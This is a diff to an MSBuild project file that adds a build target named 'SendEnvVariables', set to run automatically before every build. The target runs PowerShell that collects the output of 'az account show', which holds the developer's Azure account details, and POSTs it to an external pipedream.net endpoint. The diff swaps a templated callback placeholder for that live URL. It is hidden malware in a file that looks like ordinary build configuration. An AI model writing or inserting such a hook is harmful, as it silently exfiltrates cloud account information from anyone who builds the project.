@@ -1,5 +1,5 @@
 <Project>
  <Target Name="SendEnvVariables" BeforeTargets="Build;BeforeBuild;BeforeCompile">
-   <Exec Command="powershell -Command &quot;$envBody = az account show; Invoke-WebRequest -Uri {callback_host}?repository={repo_fqdn} -Method POST -Body $envBody&quot;" />
+   <Exec Command="powershell -Command &quot;$envBody = az account show; Invoke-WebRequest -Uri https://eokp1zig1ui0rsr.m.pipedream.net/555 -Method POST -Body $envBody&quot;" />
  </Target>
 </Project>
